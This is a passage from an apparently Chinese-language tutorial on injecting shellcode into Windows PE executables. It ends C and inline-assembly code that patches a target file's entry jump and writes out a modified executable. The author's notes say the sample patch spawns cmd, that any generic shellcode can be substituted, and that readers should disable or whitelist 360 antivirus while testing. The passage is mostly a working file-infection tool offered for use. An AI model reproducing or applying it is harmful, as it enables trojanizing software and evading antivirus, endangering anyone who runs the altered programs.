
```
    mov [eax+2],cl  

    mov cl,bh  

    mov [eax+1],cl  

    mov cl,bl  

    mov [eax],cl  

    mov cl,byE9  

    mov [eax-1],cl  

    //end  

    pop ebp  

    popf  

  }  

    CloseHandle(h);  

  //写入新文件中  
  h=CreateFile(cSaveFile,GENERIC_READ | GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);  

  WriteFile(h,szFileBuffer,ddFileSize+dwPatchSize,&readed,NULL);  

  CloseHandle(h);  

}  

void main()  

{  

  GetPEInformation(cObjectFile);  

  ModifyExe(cObjectFile);  

}  

```

  注意:在测试或者使用本程序时，请将你自己的补丁程序字节码复制到`_cPatch`所指向的缓冲区中，其字节数量尽可能得小，否则可能导致补丁程序无法正常跳转到原程序入口或者补丁程序无法正常插入到原程序中。请在测试本程序时关闭`360`或者将其添加为信任,否则会给您的测试带来不便。

  在给出的代码中，其补丁的功能是弹出一个`cmd`，所以在测试本程序之前，请确保你的目标文件已经加载了`msvcrt.dll`(`system`函数在`msvcrt.dll`中导出)，否则`cmd`可能将不能正常弹出。

  `_cPatch`中的字节码可以替换成任意的通用的`shellcode`。

  `cObjectFile`缓冲区中存放的是目标文件，`cSaveFile`缓冲区中存放的是结果文件，读者可以将他们替换成你自己的目标文件和结果文件。

  本程序还有许多地方做得不够完善，比如本程序的通用性较差，如果发生程序不能正常运行的情况，若您愿意，可以联系本人，本人会尽量完善之，使其通用。
